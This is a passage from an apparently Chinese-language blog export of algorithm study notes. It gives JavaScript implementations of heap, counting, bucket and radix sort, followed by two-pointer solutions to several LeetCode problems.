class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token function">heapify</span><span class="token punctuation">(</span>array<span class="token punctuation">,</span> i<span class="token punctuation">,</span> heapSize<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 堆排序</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> j <span class="token operator">=</span> heapSize <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">>=</span> <span class="token number">1</span><span class="token punctuation">;</span> j<span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      temp <span class="token operator">=</span> array<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      array<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> array<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>      array<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> temp<span class="token punctuation">;</span>      <span class="token function">heapify</span><span class="token punctuation">(</span>array<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">--</span>heapSize<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> array<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">/*方法说明：维护堆的性质@param  arr 数组@param  x   数组下标@param  len 堆大小*/</span><span class="token keyword">function</span> <span class="token function">heapify</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> x<span class="token punctuation">,</span> len<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> l <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">*</span> x <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> r <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">*</span> x <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">,</span> largest <span class="token operator">=</span> x<span class="token punctuation">,</span> temp<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>l <span class="token operator">&lt;</span> len <span class="token operator">&amp;&amp;</span> arr<span class="token punctuation">[</span>l<span class="token punctuation">]</span> <span class="token operator">></span> arr<span class="token punctuation">[</span>largest<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      largest <span class="token operator">=</span> l<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>r <span class="token operator">&lt;</span> len <span class="token operator">&amp;&amp;</span> arr<span class="token punctuation">[</span>r<span class="token punctuation">]</span> <span class="token operator">></span> arr<span class="token punctuation">[</span>largest<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      largest <span class="token operator">=</span> r<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>largest <span class="token operator">!=</span> x<span class="token punctuation">)</span> <span class="token punctuation">{</span>      temp <span class="token operator">=</span> arr<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">;</span>      arr<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token operator">=</span> arr<span class="token punctuation">[</span>largest<span class="token punctuation">]</span><span class="token punctuation">;</span>      arr<span class="token punctuation">[</span>largest<span class="token punctuation">]</span> <span class="token operator">=</span> temp<span class="token punctuation">;</span>      <span class="token function">heapify</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> largest<span class="token punctuation">,</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><hr><blockquote><p>下面要介绍的 <strong>计数排序、桶排序、基数排序</strong> ，它们的平均时间复杂度都为 <strong>O(n)</strong>。</p><p>因为这三个排序算法的时间复杂度是线性的，所以我们把这类排序算法叫作 <strong>线性排序</strong>（Linear sort）。</p><p>之所以能做到线性的时间复杂度，主要原因是，这三个算法不是基于比较的排序算法，都不涉及元素之间的比较操作。</p></blockquote><h2 id="计数排序"><a href="#计数排序" class="headerlink" title="计数排序"></a>计数排序</h2><ol><li><p>找出待排序的数组中最大和最小的元素。</p></li><li><p>统计数组中每个值为 i 的元素出现的次数，存入新数组 countArr 的第 i 项。</p></li><li><p>对所有的计数累加（从 countArr 中的第一个元素开始，每一项和前一项相加）。</p></li><li><p>反向填充目标数组：将每个元素 i 放在新数组的第 countArr[i] 项，每放一个元素就将 countArr[i] 减去 1 。</p></li></ol><ul><li>只能用在数据范围不大的场景中，若数据范围 k 比要排序的数据 n 大很多，就不适合用计数排序。</li><li>计数排序只能给非负整数排序，其他类型需要在不改变相对大小情况下，转换为非负整数。</li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">countingSort</span><span class="token punctuation">(</span>array<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> len <span class="token operator">=</span> array<span class="token punctuation">.</span>length<span class="token punctuation">,</span>        B <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        C <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        min <span class="token operator">=</span> max <span class="token operator">=</span> array<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> len<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        min <span class="token operator">=</span> min <span class="token operator">&lt;=</span> array<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">?</span> min <span class="token punctuation">:</span> array<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        max <span class="token operator">=</span> max <span class="token operator">>=</span> array<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">?</span> max <span class="token punctuation">:</span> array<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        C<span class="token punctuation">[</span>array<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> C<span class="token punctuation">[</span>array<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">?</span> C<span class="token punctuation">[</span>array<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span> <span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> j <span class="token operator">=</span> min<span class="token punctuation">;</span> j <span class="token operator">&lt;</span> max<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        C<span class="token punctuation">[</span>j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>C<span class="token punctuation">[</span>j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">||</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>C<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">||</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> k <span class="token operator">=</span> len <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> k <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> k<span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        B<span class="token punctuation">[</span>C<span class="token punctuation">[</span>array<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> array<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">;</span>        C<span class="token punctuation">[</span>array<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">--</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> B<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h2 id="桶排序"><a href="#桶排序" class="headerlink" title="桶排序"></a>桶排序</h2><blockquote><p>桶排序是计数排序的升级版。它利用了函数的映射关系，高效与否的关键就在于这个映射函数的确定。</p><p>桶排序 (Bucket sort)的工作的原理：假设输入数据服从均匀分布，将数据分到有限数量的桶里，每个桶再分别排序（有可能再使用别的排序算法或是以递归方式继续使用桶排序进行排序）</p></blockquote><pre class=" language-js"><code class="language-js"><span class="token keyword">const</span> utils <span class="token operator">=</span> <span class="token punctuation">{</span>      <span class="token function">swap</span><span class="token punctuation">(</span>array<span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">[</span>array<span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token punctuation">,</span> array<span class="token punctuation">[</span>b<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span>array<span class="token punctuation">[</span>b<span class="token punctuation">]</span><span class="token punctuation">,</span> array<span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token punctuation">]</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token function">randomNum</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> Math<span class="token punctuation">.</span><span class="token function">floor</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">100</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token function">randomArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> Array<span class="token punctuation">.</span><span class="token keyword">from</span><span class="token punctuation">(</span><span class="token function">Array</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">randomNum</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> _ <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">randomNum</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">bucketSort</span><span class="token punctuation">(</span>array<span class="token punctuation">,</span> size <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">let</span> min <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span><span class="token operator">...</span>array<span class="token punctuation">)</span>  <span class="token keyword">let</span> max <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span><span class="token operator">...</span>array<span class="token punctuation">)</span>  <span class="token keyword">let</span> count <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">floor</span><span class="token punctuation">(</span><span class="token punctuation">(</span>max <span class="token operator">-</span> min<span class="token punctuation">)</span> <span class="token operator">/</span> size<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span>  <span class="token keyword">let</span> buckets <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> count<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    buckets<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> v <span class="token keyword">of</span> array<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> num <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">floor</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v <span class="token operator">-</span> min<span class="token punctuation">)</span> <span class="token operator">/</span> size<span class="token punctuation">)</span>    buckets<span class="token punctuation">[</span>num<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span>  <span class="token punctuation">}</span>  <span class="token keyword">let</span> result <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span>bucket <span class="token keyword">of</span> buckets<span class="token punctuation">)</span> <span class="token punctuation">{</span>    result<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token operator">...</span><span class="token function">insertionSort</span><span class="token punctuation">(</span>bucket<span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token punctuation">}</span>  <span class="token keyword">return</span> result<span class="token punctuation">}</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">bucketSort</span><span class="token punctuation">(</span>utils<span class="token punctuation">.</span><span class="token function">randomArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">function</span> <span class="token function">insertionSort</span><span class="token punctuation">(</span>array<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> array<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> j <span class="token operator">=</span> i    <span class="token keyword">let</span> target <span class="token operator">=</span> array<span class="token punctuation">[</span>j<span class="token punctuation">]</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>j <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> array<span class="token punctuation">[</span>j<span class="token number">-1</span><span class="token punctuation">]</span> <span class="token operator">></span> target<span class="token punctuation">)</span> <span class="token punctuation">{</span>      array<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> array<span class="token punctuation">[</span>j<span class="token number">-1</span><span class="token punctuation">]</span>      j<span class="token operator">--</span>    <span class="token punctuation">}</span>    array<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> target  <span class="token punctuation">}</span>  <span class="token keyword">return</span> array<span class="token punctuation">}</span></code></pre><h2 id="基数排序"><a href="#基数排序" class="headerlink" title="基数排序"></a>基数排序</h2><ol><li>取得数组中的最大数，并取得位数；</li><li>arr为原始数组，从最低位开始取每个位组成radix数组；</li><li>对radix进行计数排序（利用计数排序适用于小范围数的特点）；</li></ol><ul><li><a href="https://user-gold-cdn.xitu.io/2016/11/29/54c03e0f47fcb8203389f99f65860ee6?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" target="_blank" rel="noopener">基数排序图示</a></li></ul><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">/** * 基数排序适用于： *  (1)数据范围较小，建议在小于1000 *  (2)每个数值都要大于等于0 * @author xiazdong * @param  arr 待排序数组 * @param  maxDigit 最大位数 */</span><span class="token comment" spellcheck="true">//LSD Radix Sort</span><span class="token keyword">function</span> <span class="token function">radixSort</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> maxDigit<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> mod <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> dev <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> counter <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> maxDigit<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">,</span> dev <span class="token operator">*</span><span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">,</span> mod <span class="token operator">*</span><span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">var</span> bucket <span class="token operator">=</span> <span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">%</span> mod<span class="token punctuation">)</span> <span class="token operator">/</span> dev<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>counter<span class="token punctuation">[</span>bucket<span class="token punctuation">]</span><span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                counter<span class="token punctuation">[</span>bucket<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            counter<span class="token punctuation">[</span>bucket<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">var</span> pos <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> counter<span class="token punctuation">.</span>length<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">var</span> value <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>counter<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">!=</span><span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>value <span class="token operator">=</span> counter<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">shift</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                      arr<span class="token punctuation">[</span>pos<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> value<span class="token punctuation">;</span>                <span class="token punctuation">}</span>          <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> arr<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>双指针</title>
      <link href="2020/11/30/%E7%AE%97%E6%B3%95-%E5%8F%8C%E6%8C%87%E9%92%88/"/>
      <url>2020/11/30/%E7%AE%97%E6%B3%95-%E5%8F%8C%E6%8C%87%E9%92%88/</url>
      
        <content type="html"><![CDATA[<ul><li>盛水最多的容器</li><li>删除链表的倒数第n个结点</li><li>环形链表</li><li>验证回文字符串</li></ul><h2 id="盛水最多的容器"><a href="#盛水最多的容器" class="headerlink" title="盛水最多的容器"></a>盛水最多的容器</h2><ul><li><a href="https://leetcode-cn.com/problems/container-with-most-water/" target="_blank" rel="noopener">leetcode11</a></li><li><a href="https://leetcode-cn.com/problems/container-with-most-water/solution/sheng-zui-duo-shui-de-rong-qi-by-leetcode-solution/" target="_blank" rel="noopener">题解</a></li></ul><blockquote><p>给你 n 个非负整数 a1，a2，…，an，每个数代表坐标中的一个点 (i, ai) 。在坐标内画 n 条垂直线，垂直线 i 的两个端点分别为 (i, ai) 和 (i, 0) 。找出其中的两条线，使得它们与 x 轴共同构成的容器可以容纳最多的水。</p><p>说明：你不能倾斜容器。</p><p>示例 1：<br>输入：[1,8,6,2,5,4,8,3,7]<br>输出：49<br>解释：图中垂直线代表输入数组 [1,8,6,2,5,4,8,3,7]。在此情况下，容器能够容纳水（表示为蓝色部分）的最大值为 49。</p><p>示例 2：<br>输入：height = [1,1]<br>输出：1</p><p>示例 3：<br>输入：height = [4,3,2,1,4]<br>输出：16</p><p>示例 4：<br>输入：height = [1,2,1]<br>输出：2</p></blockquote><ul><li>双指针法，原理详看题解</li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> maxArea <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>height<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> left <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">let</span> right <span class="token operator">=</span> height<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span>    <span class="token keyword">let</span> ans <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>left <span class="token operator">!==</span> right<span class="token punctuation">)</span> <span class="token punctuation">{</span>        ans <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>ans<span class="token punctuation">,</span> Math<span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span>height<span class="token punctuation">[</span>left<span class="token punctuation">]</span><span class="token punctuation">,</span> height<span class="token punctuation">[</span>right<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>right <span class="token operator">-</span> left<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>height<span class="token punctuation">[</span>left<span class="token punctuation">]</span> <span class="token operator">></span> height<span class="token punctuation">[</span>right<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            right <span class="token operator">--</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            left <span class="token operator">++</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> ans<span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><h2 id="删除链表的倒数第n个结点"><a href="#删除链表的倒数第n个结点" class="headerlink" title="删除链表的倒数第n个结点"></a>删除链表的倒数第n个结点</h2><ul><li><a href="https://leetcode-cn.com/problems/remove-nth-node-from-end-of-list/" target="_blank" rel="noopener">leetcode19</a></li></ul><blockquote><p>给定一个链表，删除链表的倒数第 n 个节点，并且返回链表的头结点。</p><p>示例：</p><p>给定一个链表: 1-&gt;2-&gt;3-&gt;4-&gt;5, 和 n = 2.</p><p>当删除了倒数第二个节点后，链表变为 1-&gt;2-&gt;3-&gt;5.</p></blockquote><ul><li>思路：双指针，快的先走 n 步，然后两个一起走到最后，慢的就是倒数第 n 个，只遍历了一次</li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> removeNthFromEnd <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>head<span class="token punctuation">,</span> n<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 创建头节点, 保证输入为 [1], 1 时，不会出现错误</span>    <span class="token keyword">let</span> pre <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ListNode</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    pre<span class="token punctuation">.</span>next <span class="token operator">=</span> head    <span class="token keyword">let</span> slow <span class="token operator">=</span> pre    <span class="token keyword">let</span> fast <span class="token operator">=</span> pre    <span class="token comment" spellcheck="true">// fast 先走 n 次</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        fast <span class="token operator">=</span> fast<span class="token punctuation">.</span>next    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 走到尾部</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>fast<span class="token punctuation">.</span>next <span class="token operator">!==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        slow <span class="token operator">=</span> slow<span class="token punctuation">.</span>next        fast <span class="token operator">=</span> fast<span class="token punctuation">.</span>next    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 删除</span>    slow<span class="token punctuation">.</span>next <span class="token operator">=</span> slow<span class="token punctuation">.</span>next<span class="token punctuation">.</span>next    <span class="token keyword">return</span> pre<span class="token punctuation">.</span>next<span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><h2 id="环形链表"><a href="#环形链表" class="headerlink" title="环形链表"></a>环形链表</h2><ul><li><a href="https://leetcode-cn.com/problems/linked-list-cycle/" target="_blank" rel="noopener">leetcode141</a></li></ul><pre class=" language-js"><code class="language-js">示例 <span class="token number">1</span>：输入：head <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span> pos <span class="token operator">=</span> <span class="token number">1</span>输出：<span class="token boolean">true</span>解释：链表中有一个环，其尾部连接到第二个节点。示例 <span class="token number">2</span>：输入：head <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> pos <span class="token operator">=</span> <span class="token number">0</span>输出：<span class="token boolean">true</span>解释：链表中有一个环，其尾部连接到第一个节点。</code></pre><ul><li>快慢指针法</li><li>快、慢指针，从头节点出发</li><li>慢指针每次走一步，快指针每次走两步，不断比较它们指向的节点的值</li><li>如果节点值相同，说明有环。如果不同，继续循环。</li></ul><h2 id="验证回文字符串"><a href="#验证回文字符串" class="headerlink" title="验证回文字符串"></a>验证回文字符串</h2><ul><li><a href="https://leetcode-cn.com/problems/valid-palindrome/" target="_blank" rel="noopener">leetcode125</a></li></ul><pre class=" language-js"><code class="language-js">给定一个字符串，验证它是否是回文串，只考虑字母和数字字符，可以忽略字母的大小写。说明：本题中，我们将空字符串定义为有效的回文串。示例 <span class="token number">1</span><span class="token punctuation">:</span>输入<span class="token punctuation">:</span> <span class="token string">"A man, a plan, a canal: Panama"</span>输出<span class="token punctuation">:</span> <span class="token boolean">true</span>示例 <span class="token number">2</span><span class="token punctuation">:</span>输入<span class="token punctuation">:</span> <span class="token string">"race a car"</span>输出<span class="token punctuation">:</span> <span class="token boolean">false</span></code></pre><ul><li><code>toUpperCase</code> 方法用于把字符串转换为大写</li><li><code>toLowerCase</code> 方法用于把字符串转换为小写</li><li><code>toLocaleLowerCase()</code> 和 <code>toLocaleUpperCase()</code>和上面的区别是根据地区语言来转换，一般用不到</li><li>正则中<code>\w</code>是字符组<code>[0-9a-zA-Z_]</code>的简写形式</li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> isPalindrome <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> j <span class="token operator">=</span> s<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span>    s <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">function</span> <span class="token function">isValid</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// const reg = /\w/ , 其中包含下划线，不正确</span>        <span class="token keyword">const</span> reg <span class="token operator">=</span> <span class="token regex">/[0-9a-zA-Z]/</span>        <span class="token keyword">return</span> reg<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>j <span class="token operator">>=</span> i<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isValid</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> j<span class="token operator">--</span>        <span class="token 